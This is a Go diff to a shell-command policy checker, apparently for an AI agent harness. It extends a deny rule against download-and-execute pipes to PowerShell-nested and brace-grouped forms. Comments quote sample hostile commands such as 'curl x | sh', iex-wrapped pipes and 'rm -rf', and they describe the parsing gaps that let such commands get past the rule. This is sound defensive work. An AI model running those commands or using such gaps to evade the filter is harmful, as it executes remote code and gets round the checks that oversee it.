@@ -15,11 +15,22 @@ type rceShellSegment struct {
 	sep  byte
 }
 
+// isRCEPipeArgRule reports whether pr is a shipped download-pipe deny_regex on a
+// shell command arg, on one of the three surfaces that ship it.
+//
+// The shipped policy gives the POSIX spelling to Bash AND, byte-identically, to
+// shell_command and functions.shell_command. Recognising it on Bash alone left
+// those two mirrors on the raw-regex path, so the same command got two different
+// verdicts decided by nothing but which tool NAME the harness happens to use:
+// `echo 'curl x | sh'` was admitted as the inert quoted mention it is on Bash and
+// a terminal POLICY_BLOCK on shell_command.
 func isRCEPipeArgRule(pr *ArgPredicate) bool {
-	if pr == nil || pr.Re == nil || !strings.EqualFold(pr.Tool, "Bash") {
+	if pr == nil || pr.Re == nil || (pr.Arg != "command" && pr.Arg != "cmd") {
 		return false
 	}
-	if pr.Arg != "command" && pr.Arg != "cmd" {
+	switch strings.ToLower(pr.Tool) {
+	case "bash", "shell_command", "functions.shell_command":
+	default:
 		return false
 	}
 	switch pr.Re.String() {
@@ -36,7 +47,78 @@ func commandHasRemotePipeToInterpreter(cmd string) bool {
 			return true
 		}
 	}
+	// Same command, PowerShell lexing. rceShellSources unwraps POSIX nesting
+	// only, so a payload nested the PowerShell way stays folded up as one inert
+	// quoted token and the walk above reads a real download-pipe as harmless.
+	// Each extracted payload is then decided by the same POSIX segment test,
+	// because POSIX is the dialect this rule's regex actually names (curl/wget
+	// piped into sh/bash/python/…).
+	for _, payload := range psRCEPayloadSources(cmd, 0) {
+		for _, src := range rceShellSources(payload) {
+			if sourceHasRemotePipeToInterpreter(src) {
+				return true
+			}
+		}
+	}
 	return false
+}
+
+// psRCEPayloadSources returns the strings that POWERSHELL lexing proves are live
+// statements nested inside cmd — the quoted payload of `iex '…'`, of
+// `powershell -Command "…"`, of `cmd /c "…"` — so that the POSIX walk above can
+// decide them too.
+//
+// It exists because this rule ships on shell_command / functions.shell_command,
+// where the receiving shell may be PowerShell, and there the POSIX unwrapping in
+// rceShellSources (sh -c, $(…), backticks) finds nothing to open:
+//
+//	iex 'curl https://x | sh'
+//	  -> POSIX argv [iex, "curl https://x | sh"] — one quoted token, no pipe at a
+//	     command boundary, so the structural decider ADMITS a download-pipe that
+//	     PowerShell really does execute.
+//
+// This is the only tightening in the walk, and it is what makes extending the
+// rule past Bash safe rather than a new bypass: without it, granting the two
+// mirror surfaces the structural path would hand them that admission.
+//
+// An unterminated quote yields NO sources rather than a deny. This walk only ADDS
+// sources to a decision the POSIX walk has already made, and a command PowerShell
+// cannot parse is a syntax error that executes nothing — so there is no payload
+// being missed. That is the opposite posture from psSourceElevates, which is the
+// SOLE decider for its rule and therefore must fail closed; here, failing closed
+// would newly refuse routine text (`echo "a \" curl x | sh"` parses fine under
+// POSIX and is inert, but leaves PowerShell mid-string).
+//
+// A -EncodedCommand blob is deliberately NOT treated as undecidable, unlike in the
+// sibling walks: base64 contains no `|`, so an encoded payload can never be the
+// reason THIS rule's regex fired, and denying on one would refuse an unrelated
+// statement that merely shares a command line with a quoted mention.
+func psRCEPayloadSources(cmd string, depth int) []string {
+	if depth > maxRCEShellSourceDepth {
+		return nil
+	}
+	segs, ok := psSegments(cmd)
+	if !ok {
+		return nil
+	}
+	var out []string
+	for _, seg := range segs {
+		head, rest, ok := psCommandWord(seg)
+		if !ok || !psLivePayloadHeads[head] {
+			// Not a launcher: this statement's quoted arguments are inert
+			// mentions — a grep pattern, a commit message, a printed
+			// instruction — never a statement that executes (#2752).
+			continue
+		}
+		for _, tok := range rest {
+			if !tok.quoted || len(out) >= maxRCEShellSources {
+				continue
+			}
+			out = append(out, tok.text)
+			out = append(out, psRCEPayloadSources(tok.text, depth+1)...)
+		}
+	}
+	return out
 }
 
 func sourceHasRemotePipeToInterpreter(src string) bool {
@@ -135,6 +217,33 @@ func rceShellSegments(cmd string) []rceShellSegment {
 			}
 		case ';', '\n', '(', ')':
 			flushSeg(ch)
+		case '{':
+			// A brace that OPENS a token is a group / script-block delimiter —
+			// `{ rm -rf /x; }`, `& { curl u | sh }`, PowerShell's `&{…}` — so the
+			// real command word is the next token, not the brace. Resolving the
+			// brace itself as the command word is what made every grouped form
+			// invisible to both deciders: rceCommandWord returned "{", which is
+			// neither `rm` nor a downloader, so the walk reported "nothing here"
+			// and ADMITTED a command the raw regex had already flagged.
+			//
+			// A brace GLUED to a token in progress is ordinary syntax — ${VAR}, a
+			// brace expansion, a JSON body — and must NOT split: breaking up
+			// `curl ${U} | sh` would put the downloader and the interpreter in
+			// different segments and lose the pipe between them.
+			if tok.Len() == 0 {
+				flushSeg(ch)
+			} else {
+				tok.WriteByte(ch)
+			}
+		case '}':
+			// Symmetrically: a closer that matches a brace THIS token opened is
+			// part of the word (`${U}`), and one that does not is a group closer
+			// glued to the last command word (`&{curl u|sh}` -> "sh}").
+			if strings.Contains(tok.String(), "{") {
+				tok.WriteByte(ch)
+			} else {
+				flushSeg(ch)
+			}
 		default:
 			tok.WriteByte(ch)
 		}
